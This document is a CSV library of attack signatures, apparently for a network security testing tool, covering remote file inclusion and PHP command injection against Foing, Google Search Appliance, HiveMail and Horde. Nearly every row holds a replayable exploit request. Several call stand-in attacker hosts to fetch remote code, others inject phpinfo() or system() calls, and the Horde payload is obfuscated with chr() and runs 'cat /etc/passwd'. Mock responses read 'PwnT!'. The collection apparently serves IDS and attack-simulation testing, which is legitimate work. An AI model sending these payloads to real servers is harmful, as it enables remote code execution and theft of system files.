XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
foing_cmi_f.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability,"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via playlist.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿foing_cmi_f_IPv6.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability (IPv6 Version),"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via playlist.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /foing/playlist.php?phpbb_root_path=http://evilcode.txt?&cmd=uname%20-a HTTP/1.1[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A ]]HOST: www.example.com[[0D 0A 0D 0A]]"
foing_cmi_f_IPv6.xml,Foing 0.7.0 (phpBB) Remote File Inclusion Vulnerability (IPv6 Version),"This threat send a crafted HTTP query containing a path to an arbitrary file which is included by the server and executed via playlist.phps ""phpbb_root_path"" parameter. Foing is a web based application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿googleapp_cmi.xml,Google Appliance ProxyStyleSheet Command Execution,This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80.,HTTP,TCP,GET /search?client=test&site=test&output=xml_no_dtd&proxystylesheet=http://threathost.com:8080/KhXrqs.xsl&q=MB9NL5Iasxt6Li6BbMfKbWxbIji&proxyreload=1 HTTP/1.0[[0D 0A 0D 0A]]
googleapp_cmi.xml,Google Appliance ProxyStyleSheet Command Execution,This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿googleapp_cmi_IPv6.xml,Google Appliance ProxyStyleSheet Command Execution (IPv6 Version),This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,GET /search?client=test&site=test&output=xml_no_dtd&proxystylesheet=http://threathost.com:8080/KhXrqs.xsl&q=MB9NL5Iasxt6Li6BbMfKbWxbIji&proxyreload=1 HTTP/1.0[[0D 0A 0D 0A]]
googleapp_cmi_IPv6.xml,Google Appliance ProxyStyleSheet Command Execution (IPv6 Version),This threat sends a crafted HTTP Request with with a modified URL string containing a URL path to a remote file that can be executed. The google search appliance is an application running on a hardware appliance that typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_a.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /addressbook.update.php?cmd=remove&contactgroupid=1%20--%20"";phpinfo();@ob_start(""&submit=1&contactcheck[]=1&con HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_a.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_a_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /addressbook.update.php?cmd=remove&contactgroupid=1%20--%20"";phpinfo();@ob_start(""&submit=1&contactcheck[]=1&con HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_a_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_b.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /addressbook.add.php?cmd=quick&messageid=1"");phpinfo();@ob_start(""&popid=1&msgid=1 HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_b.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_b_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /addressbook.add.php?cmd=quick&messageid=1"");phpinfo();@ob_start(""&popid=1&msgid=1 HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_b_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_c.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"GET /folders.update.php?cmd=mark&folderid=0%20--%20%22);phpinfo();@ob_start(%22 HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_c.xml,HiveMail Vulnerabilities Remote Command Execution,This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_c_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"GET /folders.update.php?cmd=mark&folderid=0%20--%20%22);phpinfo();@ob_start(%22 HTTP/1.0[[0D 0A ]]Accept: text/html, text/plain, application/x-ogg, application/ogg, text/vnd.rn-realtext, image/vnd.rn-realpix, application/smil, audio/mp3, audio/x-mp3, audio/mpeg, audio/mpg, audio/x-mpeg, audio/x-mpg, audio/mpegurl, audio/x-mpegurl, audio/wav[[0D 0A ]]Accept-Encoding: gzip, compress[[0D 0A ]]Accept-Language: en[[0D 0A ]]User-Agent: Lynx/2.8.5rel.1 libwww-FM/2.14 SSL-MM/1.4.1 OpenSSL/0.9.7i[[0D 0A 0D 0A]]"
hivemail_cmi_c_IPv6.xml,HiveMail Vulnerabilities Remote Command Execution (IPv6 Version),This threat sends a crafted URL containing PHP code which is executed by the server. HiveMail is a web based application which typically listens on port 80. (IPv6 Version),HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_d.xml,HiveMail 1.3 remote command execution exploit,"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80.",HTTP,TCP,"GET /hivemail/addressbook.add.php?hivesession=22ead72ecf6af376a801923466a23efa&cmd=quick&messageid=%22);echo%20%22start_er%22;system($com);echo%20%22end_er%22;@d(%22&popid=1&com=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: 127.0.0.1[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
hivemail_cmi_d.xml,HiveMail 1.3 remote command execution exploit,"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80.",HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿hivemail_cmi_d_IPv6.xml,HiveMail 1.3 remote command execution exploit (IPv6 Version),"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"GET /hivemail/addressbook.add.php?hivesession=22ead72ecf6af376a801923466a23efa&cmd=quick&messageid=%22);echo%20%22start_er%22;system($com);echo%20%22end_er%22;@d(%22&popid=1&com=cat%20/etc/passwd HTTP/1.1[[0D 0A ]]TE: deflate,gzip;q=0.3[[0D 0A ]]Connection: TE, close[[0D 0A ]]Host: 127.0.0.1[[0D 0A ]]User-Agent: libwww-perl/5.803[[0D 0A 0D 0A]]"
hivemail_cmi_d_IPv6.xml,HiveMail 1.3 remote command execution exploit (IPv6 Version),"This threat send a crafted HTTP GET query which allows the crafted URL to insert PHP code, this is then executed by the server via the ""cmd"" parameter. HiveMail is a web application with typically listens on port 80. (IPv6 Version)",HTTP/IPv6,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿horde_cmi.xml,Horde help viewer module remote PHP code execution,This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed.,HTTP,TCP,"GET /horde/services/help/?show=about&module=;"".passthru(chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(98).chr(101).chr(103).chr(95).chr(59).chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100).chr(59).chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(101).chr(110).chr(100).chr(95));'. HTTP/1.1[[0D 0A ]]Host: 216.239.37.104:80[[0D 0A ]]Content-Type: application/html[[0D 0A ]]Content-Length: 417[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
horde_cmi.xml,Horde help viewer module remote PHP code execution,This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed.,HTTP,TCP,"HTTP[[2f ]]1[[2e ]]1 200 [[4f 4b 0d 0a ]]Server[[3a ]] Apache[[0d 0a 4c ]]ast[[2d 4d 6f ]]dified[[3a ]] [[4d 6f 6e 2c ]] 02 Feb 2004 11[[3a ]]32[[3a ]]41 G[[4d ]]T[[0d 0a ]]ETag[[3a ]] ""a9d6e[[2d ]]800[[2d ]]3d25cf1854840""[[0d 0a ]]Accept[[2d ]]Ra[[6e ]]ges[[3a ]] bytes[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d 4c ]]e[[6e ]]gth[[3a ]] 5[[0d 0a 4b ]]eep[[2d ]]A[[6c ]]ive[[3a ]] ti[[6d ]]e[[6f ]]ut[[3d ]]15[[2c ]] [[6d ]]ax[[3d ]]100[[0d 0a ]]C[[6f 6e 6e ]]ecti[[6f 6e 3a ]] [[4b ]]eep[[2d ]]A[[6c ]]ive[[0d 0a ]]C[[6f 6e ]]te[[6e ]]t[[2d ]]Type[[3a ]] text[[2f ]]p[[6c ]]ai[[6e 0d 0a 0d 0a ]]Pw[[6e ]]T!"
﻿horde_cmi_IPv6.xml,Horde help viewer module remote PHP code execution (IPv6 Version),This threat sends a crafted HTTP query containing an SQL statement which when executed by the server allows the injection of PHP code which will also be executed by the server when the inserted record is displayed. (IPv6 Version),HTTP/IPv6,TCP,"GET /horde/services/help/?show=about&module=;"".passthru(chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(98).chr(101).chr(103).chr(95).chr(59).chr(99).chr(97).chr(116).chr(32).chr(47).chr(101).chr(116).chr(99).chr(47).chr(112).chr(97).chr(115).chr(115).chr(119).chr(100).chr(59).chr(101).chr(99).chr(104).chr(111).chr(32).chr(95).chr(99).chr(109).chr(100).chr(95).chr(101).chr(110).chr(100).chr(95));'. HTTP/1.1[[0D 0A ]]Host: 216.239.37.104:80[[0D 0A ]]Content-Type: application/html[[0D 0A ]]Content-Length: 417[[0D 0A ]]Connection: Close[[0D 0A 0D 0A]]"
